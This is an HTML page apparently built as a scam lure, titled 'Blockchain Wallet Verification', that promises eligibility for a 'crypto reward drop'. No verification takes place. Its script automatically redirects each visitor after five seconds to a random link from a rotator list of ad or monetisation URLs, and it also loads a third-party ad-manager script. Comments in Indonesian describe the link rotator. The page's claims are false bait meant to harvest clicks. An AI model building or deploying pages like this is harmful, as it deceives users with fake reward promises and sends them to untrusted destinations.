<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Blockchain Web3 Verification</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #0a0a0a;
      color: #fff;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      text-align: center;
    }

    h1 {
      font-size: 28px;
      margin-bottom: 10px;
      color: #00eaff;
    }

    p {
      font-size: 16px;
      color: #ccc;
      margin-bottom: 20px;
    }

    button {
      background-color: #00eaff;
      color: #000;
      border: none;
      padding: 12px 25px;
      border-radius: 8px;
      cursor: pointer;
      font-size: 16px;
      font-weight: bold;
      transition: 0.3s;
    }

    button:hover {
      background-color: #00b8cc;
    }

    #countdown {
      margin-top: 20px;
      font-size: 18px;
      color: #00ff99;
    }
  </style>
  
    <script async src="https://js.wpadmngr.com/static/adManager.js" data-admpid="356127"></script>
</head>
<body>
  <h1>Blockchain Wallet Verification</h1>
  <p>Please wait while we verify your eligibility for the crypto reward drop.</p>
  <button id="verifyBtn">Start Verification</button>

  <div id="countdown" style="display:none;">
    Redirecting in <span id="seconds">5</span> seconds...
  </div>

  <script>
    // === CONFIGURATION ===
    const redirectLinks = [
      "https://otieu.com/4/10109309",
  "https://annual-tower.com/CnVEAm",
  "https://otieu.com/4/10109321"
    ]; // daftar link rotator kamu
    const redirectDelay = 5; // detik

    // === FUNCTIONS ===
    function startCountdown() {
      document.getElementById("countdown").style.display = "block";
      let seconds = redirectDelay;
      const countdownEl = document.getElementById("seconds");

      const countdown = setInterval(() => {
        seconds--;
        countdownEl.textContent = seconds;
        if (seconds <= 0) {
          clearInterval(countdown);
          const randomLink = redirectLinks[Math.floor(Math.random() * redirectLinks.length)];
          window.location.href = randomLink;
        }
      }, 1000);
    }

    // Auto redirect setelah halaman dimuat
    window.addEventListener("load", () => {
      startCountdown();
    });

    // Juga redirect setelah tombol diklik
    document.getElementById("verifyBtn").addEventListener("click", () => {
      startCountdown();
    });
  </script>
</body>
</html>
